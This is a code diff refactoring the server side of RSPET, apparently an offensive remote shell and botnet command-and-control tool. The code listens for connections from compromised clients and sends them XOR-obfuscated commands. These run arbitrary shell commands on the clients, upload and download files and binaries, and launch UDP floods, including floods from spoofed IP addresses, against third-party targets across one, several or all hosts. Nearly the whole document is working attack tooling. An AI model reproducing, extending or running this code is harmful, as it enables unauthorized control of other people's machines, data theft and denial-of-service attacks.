@@ -1,6 +1,12 @@
 #!/usr/bin/python
 # -*- coding: <UTF-8> -*-
-"""RSPET_server.py: RSPET's Server-side script."""
+"""rspet_server.py: RSPET's Server-side script."""
+__author__ = "Kolokotronis Panagiotis"
+__copyright__ = "Copyright 2016, Kolokotronis Panagiotis"
+__credits__ = ["Kolokotronis Panagiotis", "Lain Iwakura"]
+__license__ = "MIT"
+__version__ = "0.1.0"
+__maintainer__ = "Kolokotronis Panagiotis"
 from __future__ import print_function
 from sys import exit as sysexit
 from sys import argv
@@ -14,6 +20,7 @@ import tab
 def conn_accept(sock, f_handler):
     """Listen for connection, usually invocted in parallel.
 
+    Keyword argument(s):
     sock      -- The socket to listen on
     f_handler -- instance of ClientHandler class
     """
@@ -29,6 +36,7 @@ def conn_accept(sock, f_handler):
 def send_comm(f_command, f_cur_host_con):
     """Obfuscate (xor) and send command, return integer.
 
+    Keyword argument(s):
     f_command      -- command to be sent (string)
     f_cur_host_con -- socket object
     """
@@ -45,6 +53,7 @@ def send_comm(f_command, f_cur_host_con):
 def get_len(in_string, max_len):
     """Calculate string length, return as a string with trailing 0s.
 
+    Keyword argument(s):
     in_string -- input string
     max_len   -- length of returned string
     """
@@ -58,6 +67,7 @@ def get_len(in_string, max_len):
 def recv_comm(recv_size, f_cur_host_con):
     """Receive data, deobfuscate (xor) them, return string.
 
+    Keyword argument(s):
     recv_size      -- size to receive, passed as argument to .recv()
     f_cur_host_con -- socket object
     """
@@ -71,6 +81,7 @@ def recv_comm(recv_size, f_cur_host_con):
 def print_hosts(f_active_hosts, f_list_of_selected_hosts):
     """Check if selected host is active, print details.
 
+    Keyword argument(s):
     f_active_hosts           -- list of active hosts
     f_list_of_selected_hosts -- list of currently selected hosts
     """
@@ -89,6 +100,7 @@ def print_hosts(f_active_hosts, f_list_of_selected_hosts):
 def udp_flood(target, f_cur_host_con, f_cur_host_id, f_handler):
     """Command host to Flood target with UDP packets.
 
+    Keyword argument(s):
     target         -- Target's IP and port (list)
     f_cur_host_con -- socket object
     f_cur_host_id  -- Host's ID in ClientHandler's instance
@@ -100,8 +112,7 @@ def udp_flood(target, f_cur_host_con, f_cur_host_id, f_handler):
         payload = target[2]
     except IndexError:
         payload = "Hi"
-    flood_command = '00005' # '00005' => 'udpFlood'
-    f_res = send_comm(flood_command, f_cur_host_con)
+    f_res = send_comm(CC['udpFlood'], f_cur_host_con)
     if f_res == 1:
         f_handler.remove_host(f_cur_host_id)
         return 1
@@ -121,6 +132,7 @@ def udp_flood(target, f_cur_host_con, f_cur_host_id, f_handler):
 def udp_spoof(name_set, f_cur_host_con, f_cur_host_id, f_handler):
     """Command host to Flood target with UDP packets using spoofed IP.
 
+    Keyword argument(s):
     name_set       -- [target IP, target port, spoofed IP, spoofed port]
     f_cur_host_con -- socket object
     f_cur_host_id  -- Host's ID in ClientHandler's instance
@@ -134,8 +146,7 @@ def udp_spoof(name_set, f_cur_host_con, f_cur_host_id, f_handler):
         payload = name_set[4]
     except IndexError:
         payload = 'Hi'
-    spoof_command = '00006' # '00006' => 'udpSpoof'
-    f_res = send_comm(spoof_command, f_cur_host_con)
+    f_res = send_comm(CC['udpSpoof'], f_cur_host_con)
     if f_res == 1:
         f_handler.remove_host(f_cur_host_id)
         return 1
@@ -155,6 +166,7 @@ def udp_spoof(name_set, f_cur_host_con, f_cur_host_id, f_handler):
 def make_file(name_set, f_cur_host_con, f_cur_host_id, f_handler):
     """Execute remote inclusion of file at host.
 
+    Keyword argument(s):
     name_set       -- [local file name, remote file name (optional)]
     f_cur_host_con -- socket object
     f_cur_host_id  -- Host's ID in ClientHandler's instance
@@ -166,7 +178,7 @@ def make_file(name_set, f_cur_host_con, f_cur_host_id, f_handler):
         remote_file_name = name_set[1]
     except IndexError:
         remote_file_name = file_to_read
-    f_res = send_comm('00001', f_cur_host_con) #'00001' => 'getFile'
+    f_res = send_comm(CC['getFile'], f_cur_host_con)
     if f_res == 1:
         f_handler.remove_host(f_cur_host_id)
         return 1
@@ -206,6 +218,7 @@ def make_file(name_set, f_cur_host_con, f_cur_host_id, f_handler):
 def make_binary(name_set, f_cur_host_con, f_cur_host_id, f_handler):
     """Execute remote inclusion of binary at host.
 
+    Keyword argument(s):
     name_set       -- [local binary name, remote binary name (optional)]
     f_cur_host_con -- socket object
     f_cur_host_id  -- Host's ID in ClientHandler's instance
@@ -217,7 +230,7 @@ def make_binary(name_set, f_cur_host_con, f_cur_host_id, f_handler):
         remote_bin_name = name_set[1]
     except IndexError:
         remote_bin_name = bin_to_read
-    f_res = send_comm('00002', f_cur_host_con) # '00002' => 'getBinary'
+    f_res = send_comm(CC['getBinary'], f_cur_host_con)
     if f_res == 1:
         f_handler.remove_host(f_cur_host_id)
         return 1
@@ -257,6 +270,7 @@ def make_binary(name_set, f_cur_host_con, f_cur_host_id, f_handler):
 def pull_file(name_set, f_cur_host_con, f_cur_host_id, f_handler):
     """Remotely pull file from host.
 
+    Keyword argument(s):
     name_set       -- [remote file name, local file name (optional)]
     f_cur_host_con -- socket object
     f_cur_host_id  -- Host's ID in ClientHandler's instance
@@ -273,7 +287,7 @@ def pull_file(name_set, f_cur_host_con, f_cur_host_id, f_handler):
             local_file_name = name_set[1]
         except IndexError:
             local_file_name = remote_file_name
-        f_res = send_comm('00003', f_cur_host_con) # '00003' => 'sendFile'
+        f_res = send_comm(CC['sendFile'], f_cur_host_con)
         if f_res == 1:
             f_handler.remove_host(f_cur_host_id)
             return 1
@@ -307,6 +321,7 @@ def pull_file(name_set, f_cur_host_con, f_cur_host_id, f_handler):
 def pull_binary(name_set, f_cur_host_con, f_cur_host_id, f_handler):
     """Remotely pull binary from host.
 
+    Keyword argument(s):
     name_set       -- [remote binary name, local binary name (optional)]
     f_cur_host_con -- socket object
     f_cur_host_id  -- Host's ID in ClientHandler's instance
@@ -323,7 +338,7 @@ def pull_binary(name_set, f_cur_host_con, f_cur_host_id, f_handler):
             local_bin_name = name_set[1]
         except IndexError:
             local_bin_name = remote_bin_name
-        f_res = send_comm('00004', f_cur_host_con) # '00004' => 'sendBinary'
+        f_res = send_comm(CC['sendBinary'], f_cur_host_con)
         if f_res == 1:
             f_handler.remove_host(f_cur_host_id)
             return 1
@@ -359,6 +374,7 @@ def pull_binary(name_set, f_cur_host_con, f_cur_host_id, f_handler):
 def multihost_calls(func_ref, args_list, f_handler, f_list_of_selected_hosts):
     """Call local function for multiple hosts.
 
+    Keyword argument(s):
     func_ref                 -- function to call
     args_list                -- list of arguments to pass
     f_cur_host_con           -- socket object
@@ -443,6 +459,214 @@ def make_logo():
         print(line)
 
 
+def system_comm(command, cur_host_con):
+    """Send a command to be executed directly at client's OS, print output.
+
+    Keyword argument(s):
+    command      -- command to be sent (list)
+    cur_host_con -- socket object
+    """
+    com_reconst = command
+    command = ''
+    command = " ".join(com_reconst)
+    res = send_comm(CC['command'], cur_host_con)
+    if res == 1:
+        print ("Connection closed by client")
+        return 1
+    len_command = get_len(command, 13)
+    res = send_comm(len_command, cur_host_con)
+    if res == 1:
+        print ("Connection closed by client")
+        return 1
+    res = send_comm(command, cur_host_con)
+    if res == 1:
+        print ("Connection closed by client")
+        return 1
+    decode = recv_comm(13, cur_host_con)
+    decode = recv_comm(int(decode), cur_host_con)
+    print (decode)
+    return 0
+
+
+def list_hosts(handler, command):
+    """Send a command to be executed directly at client's OS, print output.
+
+    Keyword argument(s):
+    handler -- instance of ClientHandler class
+    command -- IGNORED/INCLUDED FOR UNIFORMITY
+    """
+    active_hosts = handler.return_list_of_hosts()
+    list_of_selected_hosts = []
+    for i in range(len(active_hosts)):
+        list_of_selected_hosts.append(i)
+    print_hosts(active_hosts, list_of_selected_hosts)
+    return 0
+
+
+def close_connection(handler, list_of_selected_hosts):
+    """Send a command to be executed directly at client's OS, print output.
+
+    Keyword argument(s):
+    handler                -- instance of ClientHandler class
+    list_of_selected_hosts -- list of hosts to close connection on
+    """
+    active_hosts = handler.return_list_of_hosts()
+    for j in range(len(list_of_selected_hosts)-1, -1, -1):
+        host_at_hand = list_of_selected_hosts[j]
+        if active_hosts[host_at_hand] is None:
+            continue
+        send_comm(CC['killMe'], active_hosts[host_at_hand][0])
+        active_hosts[host_at_hand][0].close()
+        handler.remove_host(host_at_hand)
+    return 0
+
+
+def choose_host(handler, command):
+    """Command Interface for single host.
+
+    Keyword argument(s):
+    handler -- instance of ClientHandler class
+    command -- host to select (list)
+    """
+    try:
+        cur_host_id = int(command[1])
+    except (IndexError, ValueError):
+        print ("Argument missing or not int")
+        return 1
+    active_hosts = handler.return_list_of_hosts()
+    try:
+        cur_host_ip = active_hosts[cur_host_id][1][0]
+        cur_host_con = active_hosts[cur_host_id][0]
+    except IndexError:
+        print ("Host ID out of bounds")
+        return 1
+    list_connected_commands()
+    while True:
+        command = raw_input("["+cur_host_ip+"]~$ ")
+        if not command:
+            continue
+        command = command.split(" ")
+        comm_body = command[0]
+        try:
+            comm_trans = CONN_COMMAND_DICT[comm_body]
+            if comm_trans == 0: #List_Commands
+                list_connected_commands()
+            elif comm_trans == 1: #KILL
+                res = send_comm(CC['KILL'], cur_host_con)
+                if res == 1:
+                    print("Current host has closed its connection")
+                    print("Exiting to main interface ...")
+                    break
+            elif comm_trans == 2: #Close_Connection
+                close_connection(handler, [cur_host_id])
+                break
+            elif comm_trans == 3: #Exit
+                break
+        except KeyError:
+            try:
+                func_to_call = CONN_COMMAND_FUNC_DICT[comm_body]
+                args_to_pass = command[1:]
+                func_to_call(args_to_pass, cur_host_con, cur_host_id, handler)
+            except KeyError:
+                system_comm(command, cur_host_con)
+    return 0
+
+
+def select_hosts(handler, command):
+    """Command Interface for multiple hosts.
+
+    Keyword argument(s):
+    handler -- instance of ClientHandler class
+    command -- hosts to select (list)
+    """
+    list_of_selected_hosts = []
+    try:
+        hosts_string = command[1]
+        hosts_string = hosts_string.split(",")
+        for host_id in hosts_string:
+            list_of_selected_hosts.append(int(host_id.replace(" ", "")))
+    except (IndexError, ValueError):
+        print ("No host IDs provided or Host IDs not integers")
+        return 1
+    list_connected_mult_commands()
+    while True:
+        command = raw_input("[MULTIPLE]~$ ")
+        command = command.split(" ")
+        comm_body = command[0]
+        try:
+            comm_trans = CONN_MUL_COMMAND_DICT[comm_body]
+            if comm_trans == 0: #List_Commands
+                list_connected_commands()
+            elif comm_trans == 1: #List_Sel_Hosts
+                active_hosts = handler.return_list_of_hosts()
+                print_hosts(active_hosts, list_of_selected_hosts)
+            elif comm_trans == 2: #KILL
+                active_hosts = handler.return_list_of_hosts()
+                for host_at_hand in list_of_selected_hosts:
+                    if active_hosts[host_at_hand] is None:
+                        continue
+                    send_comm(CC['KILL'], active_hosts[host_at_hand][0])
+            elif comm_trans == 3: #Close_Connection
+                close_connection(handler, list_of_selected_hosts)
+                break
+            elif comm_trans == 4: #Exit
+                break
+        except KeyError:
+            try:
+                func_to_call = CONN_MUL_COMMAND_FUNC_DICT[comm_body]
+                args_to_pass = command[1:]
+                active_hosts = handler.return_list_of_hosts()
+                multihost_calls(func_to_call, args_to_pass, handler, list_of_selected_hosts)
+            except KeyError:
+                print ("Command not recognised")
+    return 0
+
+
+def all_hosts(handler, command):
+    """Command Interface for all hosts.
+
+    Keyword argument(s):
+    handler -- instance of ClientHandler class
+    command -- IGNORED/INCLUDED FOR UNIFORMITY (list)
+    """
+    active_hosts = handler.return_list_of_hosts()
+    list_of_selected_hosts = []
+    for host_id in range(len(active_hosts)):
+        list_of_selected_hosts.append(host_id)
+    list_connected_mult_commands()
+    while True:
+        command = raw_input("[ALL]~$ ")
+        command = command.split(" ")
+        comm_body = command[0]
+        try:
+            comm_trans = CONN_MUL_COMMAND_DICT[comm_body]
+            if comm_trans == 0: #List_Commands
+                list_connected_commands()
+            elif comm_trans == 1: #List_Sel_Hosts
+                active_hosts = handler.return_list_of_hosts()
+                print_hosts(active_hosts, list_of_selected_hosts)
+            elif comm_trans == 2: #KILL
+                active_hosts = handler.return_list_of_hosts()
+                for host_at_hand in list_of_selected_hosts:
+                    if active_hosts[host_at_hand] is None:
+                        continue
+                    send_comm(CC['KILL'], active_hosts[host_at_hand][0])
+            elif comm_trans == 3: #Close_Connection
+                close_connection(handler, list_of_selected_hosts)
+                break
+            elif comm_trans == 4: #Exit
+                break
+        except KeyError:
+            try:
+                func_to_call = CONN_MUL_COMMAND_FUNC_DICT[comm_body]
+                args_to_pass = command[1:]
+                active_hosts = handler.return_list_of_hosts()
+                multihost_calls(func_to_call, args_to_pass, handler, list_of_selected_hosts)
+            except KeyError:
+                print ("Command not recognised")
+    return 0
+
+
 class ClientHandler(object):
     """Class to handle client connections."""
 
@@ -454,6 +678,7 @@ class ClientHandler(object):
     def add_host(self, host, ip_port_tup, ver_type_tup):
         """Add new host to list_of_hosts.
 
+        Keyword argument(s):
         host         -- socket object
         ip_port_tup  -- tuple of host's IP and Port
         ver_type_tup -- tuple of client version and type
@@ -463,6 +688,7 @@ class ClientHandler(object):
     def remove_host(self, f_host_id):
         """Remove host from list_of_hosts.
 
+        Keyword argument(s):
         f_host_id -- ID of host to remove
         """
         self.list_of_hosts[f_host_id] = None
@@ -477,13 +703,25 @@ class ClientHandler(object):
         return self.list_of_hosts
 
 
+CC = {
+    'killMe'     : '00000',
+    'getFile'    : '00001',
+    'getBinary'  : '00002',
+    'sendFile'   : '00003',
+    'sendBinary' : '00004',
+    'udpFlood'   : '00005',
+    'udpSpoof'   : '00006',
+    'command'    : '00007',
+    'KILL'       : '00008'
+}
+
 ROOT_COMMAND_DICT = {
-    "List_Commands" : 0,
-    "List_Hosts"    : 1,
-    "Choose_Host"   : 2,
-    "Select"        : 3,
-    "ALL"           : 4,
-    "Exit"          : 5}
+    "List_Commands" : list_root_commands,
+    "List_Hosts"    : list_hosts,
+    "Choose_Host"   : choose_host,
+    "Select"        : select_hosts,
+    "ALL"           : all_hosts
+}
 
 CONN_COMMAND_FUNC_DICT = {
     "Make_File"        : make_file,
@@ -491,226 +729,62 @@ CONN_COMMAND_FUNC_DICT = {
     "Pull_File"        : pull_file,
     "Pull_Binary"      : pull_binary,
     "UDP_Flood"        : udp_flood,
-    "UDP_Spoof"        : udp_spoof}
+    "UDP_Spoof"        : udp_spoof
+}
 
 CONN_MUL_COMMAND_FUNC_DICT = {
     "Make_File"        : make_file,
     "Make_Binary"      : make_binary,
     "UDP_Flood"        : udp_flood,
-    "UDP_Spoof"        : udp_spoof}
+    "UDP_Spoof"        : udp_spoof
+}
 
 CONN_COMMAND_DICT = {
     "List_Commands"    : 0,
     "KILL"             : 1,
     "Close_Connection" : 2,
-    "Exit"             : 3}
+    "Exit"             : 3
+}
 
 CONN_MUL_COMMAND_DICT = {
     "List_Commands"    : 0,
     "List_Sel_Hosts"   : 1,
     "KILL"             : 2,
     "Close_Connection" : 3,
-    "Exit"             : 4}
+    "Exit"             : 4
+}
 
-#Start Here!
-make_logo()
-try:
-    max_conns = int(argv[1])
-except IndexError:
-    max_conns = 5
 
-s = socket(AF_INET, SOCK_STREAM)
-s.bind(("0.0.0.0", 9000))
-s.listen(max_conns)
-
-handler = ClientHandler()
-start_new_thread(conn_accept, (s, handler))
-
-list_root_commands()
-while True:
-    handler.rebuild()
-    comm_body = ""
-    comm_args = []
-    cur_host_ip = ""
-    cur_host_id = 0
-    command = raw_input("~$ ")
-    command = command.split(" ")
-    comm_body = command[0]
-
-    for i in range(1, len(command)):
-        comm_args.append(command[i])
+def main():
+    """Script's main block"""
+    make_logo()
     try:
-        translated = ROOT_COMMAND_DICT[comm_body]
-    except KeyError:
-        print ("Command not recognised! Try List_Commands for help")
-        continue
-    if translated == 0: #List_Commands
-        list_root_commands()
-    elif translated == 1: #List_Hosts
-        active_hosts = handler.return_list_of_hosts()
-        list_of_selected_hosts = []
-        for i in range(len(active_hosts)):
-            list_of_selected_hosts.append(i)
-        print_hosts(active_hosts, list_of_selected_hosts)
-    elif translated == 2: #Choose_Host
+        max_conns = int(argv[1])
+    except IndexError:
+        max_conns = 5
+    sock = socket(AF_INET, SOCK_STREAM)
+    sock.bind(("0.0.0.0", 9000))
+    sock.listen(max_conns)
+    handler = ClientHandler()
+    start_new_thread(conn_accept, (sock, handler))
+    list_root_commands()
+    while True:
+        handler.rebuild()
+        comm_body = ""
+        comm_args = []
+        command = raw_input("~$ ")
+        command = command.split(" ")
+        comm_body = command[0]
+        for i in range(1, len(command)):
+            comm_args.append(command[i])
         try:
-            cur_host_id = int(comm_args[0])
-        except (IndexError, ValueError):
-            print ("Argument missing or not int")
+            ROOT_COMMAND_DICT[comm_body](handler, command)
+        except KeyError:
+            if comm_body == "Exit":
+                sock.close()
+                sysexit()
+            print ("Command not recognised! Try List_Commands for help")
             continue
-        active_hosts = handler.return_list_of_hosts()
-        try:
-            cur_host_ip = active_hosts[cur_host_id][1][0]
-            cur_host_con = active_hosts[cur_host_id][0]
-        except IndexError:
-            print ("Host ID out of bounds")
-            continue
-        list_connected_commands()
-        while True:
-            command = raw_input("["+cur_host_ip+"]~$ ")
-            if not command:
-                continue
-            command = command.split(" ")
-            comm_body = command[0]
-            try:
-                comm_trans = CONN_COMMAND_DICT[comm_body]
-                if comm_trans == 0: #List_Commands
-                    list_connected_commands()
-                elif comm_trans == 1: #KILL
-                    res = send_comm('00008', cur_host_con) # '00008' => 'KILL'
-                    if res == 1:
-                        print("Current host has closed its connection")
-                        print("Exiting to main interface ...")
-                        break
-                elif comm_trans == 2: #Close_Connection
-                    res = send_comm('00000', cur_host_con) # '00000' => 'killMe'
-                    cur_host_con.close()
-                    handler.remove_host(cur_host_id)
-                    break
-                elif comm_trans == 3: #Exit
-                    break
-            except KeyError:
-                try:
-                    funcToCall = CONN_COMMAND_FUNC_DICT[comm_body]
-                    args_to_pass = command[1:]
-                    funcToCall(args_to_pass, cur_host_con, cur_host_id, handler)
-                except KeyError:
-                    com_reconst = command
-                    command = ''
-                    command = " ".join(com_reconst)
-                    res = send_comm('00007', cur_host_con)
-                    if res == 1:
-                        print ("Connection closed by client")
-                        break
-                    lenCommand = get_len(command, 13)
-                    res = send_comm(lenCommand, cur_host_con)
-                    if res == 1:
-                        print ("Connection closed by client")
-                        break
-                    res = send_comm(command, cur_host_con)
-                    if res == 1:
-                        print ("Connection closed by client")
-                        break
-                    decode = recv_comm(13, cur_host_con)
-                    decode = recv_comm(int(decode), cur_host_con)
-                    print (decode)
-    elif translated == 3: #Select
-        try:
-            hosts_string = command[1]
-        except IndexError:
-            print ("No host IDs provided")
-            continue
-        list_of_selected_hosts = []
-        try:
-            hosts_string = hosts_string.split(",")
-            for host_id in hosts_string:
-                list_of_selected_hosts.append(int(host_id.replace(" ", "")))
-        except ValueError:
-            print ("Host IDs not integers")
-            continue
-        list_connected_mult_commands()
-        while True:
-            command = raw_input("[MULTIPLE]~$ ")
-            command = command.split(" ")
-            comm_body = command[0]
-            try:
-                comm_trans = CONN_MUL_COMMAND_DICT[comm_body]
-                if comm_trans == 0: #List_Commands
-                    list_connected_commands()
-                elif comm_trans == 1: #List_Sel_Hosts
-                    active_hosts = handler.return_list_of_hosts()
-                    print_hosts(active_hosts, list_of_selected_hosts)
-                elif comm_trans == 2: #KILL
-                    active_hosts = handler.return_list_of_hosts()
-                    for host_at_hand in list_of_selected_hosts:
-                        if active_hosts[host_at_hand] is None:
-                            continue
-                        send_comm('00008', active_hosts[host_at_hand][0]) # '00008' => 'KILL'
-                elif comm_trans == 3: #Close_Connection
-                    jobs = []
-                    active_hosts = handler.return_list_of_hosts()
-                    for j in range(len(list_of_selected_hosts)-1, -1, -1):
-                        host_at_hand = list_of_selected_hosts[j]
-                        if active_hosts[host_at_hand] is None:
-                            continue
-                        res = send_comm('00000', active_hosts[host_at_hand][0]) #'00000' => 'killMe'
-                        active_hosts[host_at_hand][0].close()
-                        handler.remove_host(host_at_hand)
-                    break
-                elif comm_trans == 4: #Exit
-                    break
-            except KeyError:
-                try:
-                    funcToCall = CONN_MUL_COMMAND_FUNC_DICT[comm_body]
-                    args_to_pass = command[1:]
-                    active_hosts = handler.return_list_of_hosts()
-                    multihost_calls(funcToCall, args_to_pass, handler, list_of_selected_hosts)
-                except KeyError:
-                    print ("Command not recognised")
-    elif translated == 4: #ALL
-        active_hosts = handler.return_list_of_hosts()
-        list_of_selected_hosts = []
-        for host_id in range(len(active_hosts)):
-            list_of_selected_hosts.append(host_id)
-        list_connected_mult_commands()
-        while True:
-            command = raw_input("[ALL]~$ ")
-            command = command.split(" ")
-            comm_body = command[0]
-            try:
-                comm_trans = CONN_MUL_COMMAND_DICT[comm_body]
-                if comm_trans == 0: #List_Commands
-                    list_connected_commands()
-                elif comm_trans == 1: #List_Sel_Hosts
-                    active_hosts = handler.return_list_of_hosts()
-                    print_hosts(active_hosts, list_of_selected_hosts)
-                elif comm_trans == 2: #KILL
-                    active_hosts = handler.return_list_of_hosts()
-                    for host_at_hand in list_of_selected_hosts:
-                        if active_hosts[host_at_hand] is None:
-                            continue
-                        send_comm('00008', active_hosts[host_at_hand][0]) # '00008' => 'KILL'
-                elif comm_trans == 3: #Close_Connection
-                    jobs = []
-                    active_hosts = handler.return_list_of_hosts()
-                    for j in range(len(list_of_selected_hosts)-1, -1, -1):
-                        host_at_hand = list_of_selected_hosts[j]
-                        if active_hosts[host_at_hand] is None:
-                            continue
-                        res = send_comm('00000', active_hosts[host_at_hand][0]) #'00000' => 'killMe'
-                        active_hosts[host_at_hand][0].close()
-                        handler.remove_host(host_at_hand)
-                    break
-                elif comm_trans == 4: #Exit
-                    break
-            except KeyError:
-                try:
-                    funcToCall = CONN_MUL_COMMAND_FUNC_DICT[comm_body]
-                    args_to_pass = command[1:]
-                    active_hosts = handler.return_list_of_hosts()
-                    multihost_calls(funcToCall, args_to_pass, handler, list_of_selected_hosts)
-                except KeyError:
-                    print ("Command not recognised")
-    elif translated == 5: #Exit
-        s.close()
-        sysexit()
+
+if __name__ == '__main__':
+    main()
